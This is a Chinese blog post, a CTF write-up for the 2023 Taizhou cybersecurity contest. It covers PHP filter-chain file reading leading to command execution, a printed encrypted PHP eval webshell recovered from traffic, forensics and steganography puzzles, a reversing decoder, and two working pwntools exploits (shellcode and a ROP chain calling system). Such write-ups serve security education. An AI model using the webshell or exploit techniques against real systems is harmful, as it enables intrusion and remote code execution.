@@ -1,0 +1,896 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
+  <link rel="icon" href="/img/favicon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dr0n">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="webbriefphp12345678910111213141516171819202122&lt;!--&lt;a href&#x3D;&quot;&#x2F;?source&quot;&gt;source&lt;&#x2F;a&gt;--&gt;&lt;?php if (isset($_GET[&amp;#x27;source&amp;#x27;])) highlight_file(__FILE__)  ?&gt;&lt;?php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023台州市第三届网络安全大赛wp">
+<meta property="og:url" content="https://www.dr0n.top/posts/8779ab40/index.html">
+<meta property="og:site_name" content="Dr0n&#39;s blog">
+<meta property="og:description" content="webbriefphp12345678910111213141516171819202122&lt;!--&lt;a href&#x3D;&quot;&#x2F;?source&quot;&gt;source&lt;&#x2F;a&gt;--&gt;&lt;?php if (isset($_GET[&amp;#x27;source&amp;#x27;])) highlight_file(__FILE__)  ?&gt;&lt;?php">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c2.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c1.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c3.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c4.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c6.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c5.png">
+<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c7.png">
+<meta property="article:published_time" content="2023-09-27T06:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-29T08:47:27.923Z">
+<meta property="article:author" content="dr0n">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="台州">
+<meta property="article:tag" content="2023">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png">
+  
+  
+  
+  <title>2023台州市第三届网络安全大赛wp - Dr0n&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"150aacf9a16405ad4ea9ead54ecac598","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Dr0n&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                时间轴
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/fluid-bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023台州市第三届网络安全大赛wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        dr0n
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-27 14:00" pubdate>
+          2023年9月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2023台州市第三届网络安全大赛wp</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="briefphp"><a href="#briefphp" class="headerlink" title="briefphp"></a>briefphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--&lt;a href=<span class="hljs-string">&quot;/?source&quot;</span>&gt;source&lt;/a&gt;--&gt;<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>)  <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./shell.php&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br><br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;!DOCTYPE&#x27;</span>) === False) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed to read&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> nothing here<br></code></pre></td></tr></table></figure>
+
+<p>只能读取以<code>&lt;!DOCTYPE</code>开头的文件，直接用<code>php_filter_chain_generator</code>构造</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-1.png"></p>
+<p>读取shell.php</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-2.png"></p>
+<p>然后文件包含转命令执行</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-web-3.png"></p>
+<p>蚁剑连接拿到flag</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="这是神马"><a href="#这是神马" class="headerlink" title="这是神马"></a>这是神马</h2><p>流量分析，导出http对象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>	<span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;144a6b2296333602&quot;</span>;<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>	<span class="hljs-title function_ invoke__">session_write_close</span>();<br>	<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br>		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    			 <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>	&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>拿到key后解密冰蝎流量</p>
+<p>其中一条流量中发现命令<code>cd /var/www/html/upload/../;tar -czvf - flag | openssl des3 -salt -k th1sisKey -out ./flag.tar.gz</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c2.png"></p>
+<p>生成<code>openssl des3 -salt -k th1sisKey -in ./flag.tar.gz -d -out out.tar.gz</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c1.png"></p>
+<p>解压得到<br><code>🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅✉🚰🚹🎤💧📂👑🚫ℹ🍴😎ℹ🚨📮🛩🥋🥋🔪☀🌉😡👑😂🌊⌨🚪🚹😎🎈💧🕹💧🏎☃ℹ☃🔪🍌✅😇🍍⌨🌿💧🌊🎅☂⏩🌊🍵📮☀💵⌨☂📮😇☂🐍😆☀🚪🚹🍵💧🌏🚫😆🐘🐅😀🚰🐍🙃💧🗒🗒 </code></p>
+<p>使用<code>th1sisKey</code>密钥解emoji-aes得到flag</p>
+<h2 id="李先生的计算机"><a href="#李先生的计算机" class="headerlink" title="李先生的计算机"></a>李先生的计算机</h2><p><code>2.ad1</code>文件，使用FTK Imager挂载</p>
+<p>根据提示直接找邮件存储位置<code>MailMasterData</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c3.png"></p>
+<p>拿到search.db文件，用db browser查看</p>
+<p>得到转账金额<code>600</code>和附件密码<code>dbt_1126_tta</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c4.png"></p>
+<p>jpg加密软件密码<code>123654</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c6.png"></p>
+<p>附件可以在<code>MailMasterData</code>下或<code>download</code>目录下找到</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c5.png"></p>
+<p>解压后得到<code>BorromeanIslands.jpg</code>，jphs解密后得到银行卡号<code>6222025567723373838</code></p>
+<p><code>DASCTF&#123;600_6222025567723373838&#125;</code></p>
+<h2 id="Black-Mamba"><a href="#Black-Mamba" class="headerlink" title="Black Mamba"></a>Black Mamba</h2><p>iend后有冗余数据，提取出来后异或24</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.zip&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    f.write(<span class="hljs-built_in">bytes</span>([i^<span class="hljs-number">24</span>]))<br>f.close()<br></code></pre></td></tr></table></figure>
+
+<p>异或后是压缩包，hint是<code>说了很多次不要用这么常见的密码了</code></p>
+<p>掏出祖传的字典爆破，得到<code>1qaz@WSX</code></p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/tz2023-c7.png"></p>
+<p>解压后是</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">EAOJYU?TRX&gt;&#123;XPFABY&#123;<span class="hljs-number">8</span>&#123;<span class="hljs-number">24</span>+<br>有人好像对我键盘做了点手脚，看起来像坏了一样。<br></code></pre></td></tr></table></figure>
+
+<p>Dvorak解码得到<code>DASCTF&#123;KOBE_BRYANT_8_24&#125;</code></p>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="rrrrs"><a href="#rrrrs" class="headerlink" title="rrrrs"></a>rrrrs</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">a</span>):<br>    a^=a&gt;&gt;<span class="hljs-number">18</span><br>    a^=(a&lt;&lt;<span class="hljs-number">15</span>)&amp;<span class="hljs-number">0xefc60000</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        a^=((a&amp;(<span class="hljs-number">127</span>&lt;&lt;(<span class="hljs-number">7</span>*i)))&lt;&lt;<span class="hljs-number">7</span>)&amp;(<span class="hljs-number">0x9d2c5680</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        a^=(a&amp;(<span class="hljs-number">4292870144</span>&gt;&gt;(<span class="hljs-number">11</span>*i)))&gt;&gt;<span class="hljs-number">11</span><br>    <span class="hljs-keyword">return</span> a.to_bytes(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;big&#x27;</span>)<br><br>c=[<br><span class="hljs-number">0xa7a1e601</span>,<br><span class="hljs-number">0x10a6a5df</span>,<br><span class="hljs-number">0xa3f03b11</span>,<br><span class="hljs-number">0x7e523d64</span>,<br><span class="hljs-number">0xcb99d7a8</span>,<br><span class="hljs-number">0x2ddc2485</span>,<br><span class="hljs-number">0xe3c8b3cd</span>,<br><span class="hljs-number">0x6b82a51e</span>,<br><span class="hljs-number">0x0ea07814</span>,<br><span class="hljs-number">0x6bf2bf07</span>]<br>flag=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    flag+=decode(i)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyshell"><a href="#babyshell" class="headerlink" title="babyshell"></a>babyshell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>p=remote(<span class="hljs-string">&quot;tcp.cloud.dasctf.com&quot;</span>,<span class="hljs-string">&quot;21844&quot;</span>)<br><span class="hljs-comment">#p=process(&#x27;babyshell&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&quot;bp $rebase(0x1366)&quot;)</span><br><span class="hljs-comment">#pause()</span><br>shellcode=shellcraft.openat(-<span class="hljs-number">100</span>,<span class="hljs-string">&quot;flag&quot;</span>)<br>shellcode+=shellcraft.brk()<br>shellcode+=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rsi,rax</span><br><span class="hljs-string">sub rsi,0x1000</span><br><span class="hljs-string">mov rdi,3</span><br><span class="hljs-string">mov rdx,0x100</span><br><span class="hljs-string">mov rax,0</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="mercedes"><a href="#mercedes" class="headerlink" title="mercedes"></a>mercedes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-string">&#x27;28629&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;mercedes&quot;</span>)<br>context.binary=e<br>system=e.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>comm=<span class="hljs-number">0x601090</span><br>rdi=<span class="hljs-number">0x0000000000400983</span><br>ret=<span class="hljs-number">0x00000000004005ae</span><br>p.sendafter(<span class="hljs-string">&#x27;drink&#x27;</span>,<span class="hljs-string">&#x27;tac flag 1&gt;&amp;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;you?&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(rdi)+p64(comm)+p64(ret)+p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/">#wp</a>
+      
+        <a href="/tags/%E5%8F%B0%E5%B7%9E/">#台州</a>
+      
+        <a href="/tags/2023/">#2023</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023台州市第三届网络安全大赛wp</div>
+      <div>https://www.dr0n.top/posts/8779ab40/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>dr0n</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月27日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                <i class="iconfont icon-nd"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/13f4d784/" title="第六届浙江省大学生网络与信息安全竞赛-WP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">第六届浙江省大学生网络与信息安全竞赛-WP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/cec9c888/" title="2023羊城杯决赛web&amp;pwn Break&amp;Fix wp">
+                        <span class="hidden-mobile">2023羊城杯决赛web&amp;pwn Break&amp;Fix wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.5.1/waline.min.css')
